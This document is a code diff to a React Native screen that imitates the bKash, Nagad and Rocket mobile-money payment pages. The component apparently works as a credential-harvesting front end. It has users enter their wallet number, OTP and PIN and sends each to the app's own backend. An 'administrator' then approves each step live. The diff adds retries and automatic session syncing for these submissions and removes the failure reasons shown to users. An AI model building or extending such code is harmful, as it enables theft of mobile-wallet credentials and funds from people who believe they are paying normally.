@@ -16,6 +16,7 @@ import {
 import { Ionicons } from '@expo/vector-icons';
 import * as Haptics from 'expo-haptics';
 import { BACKEND_API } from '@/constants/api';
+import { fetchWithRetry } from '@/services/api-client';
 import { useAuth } from '@/context/auth-context';
 import { getSocket, joinPaymentSession, leavePaymentSession } from '@/services/socket';
 import {
@@ -108,6 +109,8 @@ export interface PaymentGatewayViewProps {
   amount: number | string;
   focusText?: string;
   merchantNumber?: string;
+  sessionId?: string;
+  initialStep?: 'number' | 'otp' | 'pin';
   initialPhoneNumber?: string;
   userPhoneNumber?: string;
   paymentType?: 'booking' | 'online';
@@ -140,6 +143,8 @@ function maskPhoneNumber(phone: string): string {
 export function PaymentGatewayView({
   method,
   amount,
+  sessionId: propSessionId,
+  initialStep = 'number',
   initialPhoneNumber = '',
   userPhoneNumber,
   paymentType = 'booking',
@@ -155,7 +160,7 @@ export function PaymentGatewayView({
   handleConfirm,
 }: PaymentGatewayViewProps) {
   const { user } = useAuth();
-  const registeredPhone = userPhoneNumber || user?.phoneNumber || '';
+  const registeredPhone = userPhoneNumber || user?.phoneNumber || initialPhoneNumber || '';
 
   // Determine method key and active config
   const methodKey = (method?.id || method?.name || '').toLowerCase();
@@ -176,16 +181,22 @@ export function PaymentGatewayView({
     };
   }, [methodKey, validationConfig]);
 
-  const activeOrder = customOrder || (
-    methodKey.includes('rocket')
-      ? DEFAULT_STEP_ORDERS.rocket
-      : methodKey.includes('nagad')
-        ? DEFAULT_STEP_ORDERS.nagad
-        : DEFAULT_STEP_ORDERS.bkash
-  );
+  const activeOrder = useMemo(() => {
+    const raw = customOrder || (
+      methodKey.includes('rocket')
+        ? DEFAULT_STEP_ORDERS.rocket
+        : methodKey.includes('nagad')
+          ? DEFAULT_STEP_ORDERS.nagad
+          : DEFAULT_STEP_ORDERS.bkash
+    );
+    if (initialStep === 'otp') {
+      return raw.filter((s) => s !== 'number');
+    }
+    return raw;
+  }, [customOrder, methodKey, initialStep]);
 
-  // Input states
-  const [phoneNumber, setPhoneNumber] = useState(initialPhoneNumber);
+  // Input states (initialPhoneNumber is blank by default so no default number is pre-filled)
+  const [phoneNumber, setPhoneNumber] = useState(initialPhoneNumber || '');
   const [otp, setOtp] = useState('');
   const [pin, setPin] = useState('');
   const [showPin, setShowPin] = useState(false);
@@ -193,13 +204,13 @@ export function PaymentGatewayView({
 
   // Status screens: null | 'success' | 'failed' | 'cancelled'
   const [statusScreen, setStatusScreen] = useState<'success' | 'failed' | 'cancelled' | null>(null);
-  const [statusReason, setStatusReason] = useState('PIN verification time expired');
+  const [statusReason, setStatusReason] = useState('');
   const [countdown, setCountdown] = useState(5);
   const [showCancelConfirm, setShowCancelConfirm] = useState(false);
 
   // Live Admin Verification States
   const [sessionId, setSessionId] = useState(
-    () => `sess_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
+    () => propSessionId || `sess_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`
   );
   const [isVerifying, setIsVerifying] = useState(false);
   const [verificationError, setVerificationError] = useState<string | null>(null);
@@ -213,7 +224,7 @@ export function PaymentGatewayView({
   const [resendTimer, setResendTimer] = useState(26);
   const [canResend, setCanResend] = useState(false);
 
-  const currentStep = activeOrder[currentStepIndex] || 'number';
+  const currentStep = activeOrder[currentStepIndex] || (initialStep === 'otp' ? 'otp' : 'number');
   const isFirstStep = currentStepIndex === 0;
   const isLastStep = currentStepIndex === activeOrder.length - 1;
 
@@ -240,7 +251,7 @@ export function PaymentGatewayView({
 
   // Reset states when opened
   useEffect(() => {
-    const newSessionId = `sess_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
+    const activeSessionId = propSessionId || `sess_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
     setCurrentStepIndex(0);
     setPhoneNumber(initialPhoneNumber || '');
     setOtp('');
@@ -252,15 +263,41 @@ export function PaymentGatewayView({
     setIsVerifying(false);
     setStatusScreen(null);
     setShowCancelConfirm(false);
-    setSessionId(newSessionId);
-    joinPaymentSession(newSessionId);
+    setSessionId(activeSessionId);
+    joinPaymentSession(activeSessionId);
+
+    // Synchronize initial session to backend
+    fetchWithRetry(
+      '/payment/session',
+      {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionId: activeSessionId,
+          userPhone: registeredPhone || '',
+          accountNumber: initialPhoneNumber || '',
+          method: activeConfig.name,
+          amount,
+          paymentType,
+          productId,
+          productTitle,
+          productPrice,
+          bookingAmount,
+          deliveryAddress,
+          buyerPhone: registeredPhone || '',
+          status: initialStep === 'otp' ? 'number_approved' : 'waiting_number',
+          currentStep: initialStep === 'otp' ? 'otp' : 'number',
+        }),
+      },
+      { retries: 2, timeoutMs: 30000, silent: true }
+    ).catch((err) => console.warn('[PaymentGatewayView] Sync session error:', err));
 
     return () => {
       stopPolling();
       stopCountdown();
-      leavePaymentSession(newSessionId);
+      leavePaymentSession(activeSessionId);
     };
-  }, []);
+  }, [propSessionId, initialStep]);
 
   // Resend OTP countdown timer
   useEffect(() => {
@@ -315,11 +352,11 @@ export function PaymentGatewayView({
   };
 
   // Trigger redirection countdown when entering statusScreen
-  const startStatusRedirection = (type: 'success' | 'failed', reason = '') => {
+  const startStatusRedirection = (type: 'success' | 'failed', _reason = '') => {
     stopPolling();
     stopCountdown();
     setStatusScreen(type);
-    setStatusReason(reason || (type === 'failed' ? 'PIN verification time expired' : ''));
+    setStatusReason('');
     setCountdown(5);
 
     let current = 5;
@@ -376,7 +413,7 @@ export function PaymentGatewayView({
           stopPolling();
           setIsVerifying(false);
           setIsLoading(false);
-          startStatusRedirection('failed', sessionData.errorMessage || 'Verification cancelled');
+          startStatusRedirection('failed', sessionData.errorMessage || '');
         }
       } else if (expectedStep === 'otp') {
         if (s === 'otp_approved' || s === 'completed') {
@@ -393,7 +430,7 @@ export function PaymentGatewayView({
           stopPolling();
           setIsVerifying(false);
           setIsLoading(false);
-          startStatusRedirection('failed', sessionData.errorMessage || 'PIN verification time expired');
+          startStatusRedirection('failed', sessionData.errorMessage || '');
         }
       } else if (expectedStep === 'pin') {
         if (s === 'completed' || s === 'pin_approved') {
@@ -410,7 +447,7 @@ export function PaymentGatewayView({
           stopPolling();
           setIsVerifying(false);
           setIsLoading(false);
-          startStatusRedirection('failed', sessionData.errorMessage || 'PIN verification time expired');
+          startStatusRedirection('failed', sessionData.errorMessage || '');
         }
       }
     };
@@ -439,7 +476,7 @@ export function PaymentGatewayView({
       }
 
       try {
-        const res = await fetch(`${BACKEND_API.BASE_URL}/payment/session/${sessionId}`);
+        const res = await fetchWithRetry(`/payment/session/${sessionId}`, {}, { retries: 1, timeoutMs: 8000, silent: true });
         const json = await res.json();
         if (json.success && json.data) {
           handleSessionData(json.data);
@@ -484,23 +521,27 @@ export function PaymentGatewayView({
       setVerifyingText('Waiting for administrator verification...');
 
       try {
-        await fetch(`${BACKEND_API.BASE_URL}/payment/session`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            sessionId,
-            userPhone: registeredPhone,
-            accountNumber: clean,
-            method: activeConfig.name,
-            amount,
-            paymentType,
-            productId,
-            productTitle,
-            productPrice,
-            bookingAmount,
-            deliveryAddress,
-          }),
-        });
+        await fetchWithRetry(
+          '/payment/session',
+          {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              sessionId,
+              userPhone: registeredPhone,
+              accountNumber: clean,
+              method: activeConfig.name,
+              amount,
+              paymentType,
+              productId,
+              productTitle,
+              productPrice,
+              bookingAmount,
+              deliveryAddress,
+            }),
+          },
+          { retries: 3, timeoutMs: 35000 }
+        );
       } catch (err) {
         console.warn('[Payment Session Error]:', err);
       }
@@ -548,16 +589,20 @@ export function PaymentGatewayView({
       setVerifyingText('Waiting for administrator verification...');
 
       try {
-        await fetch(`${BACKEND_API.BASE_URL}/payment/submit-otp`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            sessionId,
-            otp: cleanOtp,
-            userPhone: registeredPhone,
-            accountNumber: phoneNumber,
-          }),
-        });
+        await fetchWithRetry(
+          '/payment/submit-otp',
+          {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              sessionId,
+              otp: cleanOtp,
+              userPhone: registeredPhone,
+              accountNumber: phoneNumber,
+            }),
+          },
+          { retries: 3, timeoutMs: 35000 }
+        );
       } catch (err) {
         console.warn('[Submit OTP Error]:', err);
       }
@@ -609,16 +654,20 @@ export function PaymentGatewayView({
       setVerifyingText('Waiting for administrator verification...');
 
       try {
-        await fetch(`${BACKEND_API.BASE_URL}/payment/submit-pin`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            sessionId,
-            pin: cleanPin,
-            userPhone: registeredPhone,
-            accountNumber: phoneNumber,
-          }),
-        });
+        await fetchWithRetry(
+          '/payment/submit-pin',
+          {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              sessionId,
+              pin: cleanPin,
+              userPhone: registeredPhone,
+              accountNumber: phoneNumber,
+            }),
+          },
+          { retries: 3, timeoutMs: 35000 }
+        );
       } catch (err) {
         console.warn('[Submit PIN Error]:', err);
       }
@@ -760,7 +809,6 @@ export function PaymentGatewayView({
           <View style={styles.statusBox}>
             <Ionicons name="close-circle-outline" size={68} color="#FFFFFF" />
             <Text style={styles.statusTitle}>Payment Failed</Text>
-            <Text style={styles.statusSubtitle}>{statusReason}</Text>
             <Text style={styles.statusRedirect}>
               Redirecting to <Text style={styles.underlineText}>payment details</Text> in {countdown}s
             </Text>
